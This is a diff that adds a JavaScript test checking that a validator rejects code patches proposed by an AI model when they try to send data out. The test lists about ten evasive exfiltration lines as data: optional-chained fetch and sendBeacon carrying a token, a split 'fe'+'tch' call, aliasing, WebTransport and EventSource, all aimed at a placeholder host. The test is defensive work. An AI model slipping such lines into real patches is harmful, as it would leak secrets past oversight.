@@ -193,3 +193,22 @@ test('provider reads bounded streamed responses and rejects oversized bodies wit
   assert.equal(declaredOversize.status, 'rejected');
   assert.equal(readBody, false);
 });
+
+
+test('model proposal rejects optional chaining, indirect browser APIs and aliases', () => {
+  for (const replacement of [
+    "fetch?.(\"https://example.invalid/?key=\" + token);",
+    "navigator?.sendBeacon?.(\"https://example.invalid\", token);",
+    "window?.[\"open\"]?.(\"https://example.invalid\");",
+    "globalThis[\"fe\" + \"tch\"](\"https://example.invalid\");",
+    "const send = navigator.sendBeacon.bind(navigator);",
+    "const forward = fetch; forward(\"https://example.invalid\");",
+    "const transport = new WebTransport(\"https://example.invalid\");",
+    "const stream = new EventSource(\"https://example.invalid\");",
+    "const access = location?.assign;",
+    "self[\"fetch\"](\"https://example.invalid\");",
+  ]) {
+    const attempted = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'indirect transport safety test' });
+    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
+  }
+});
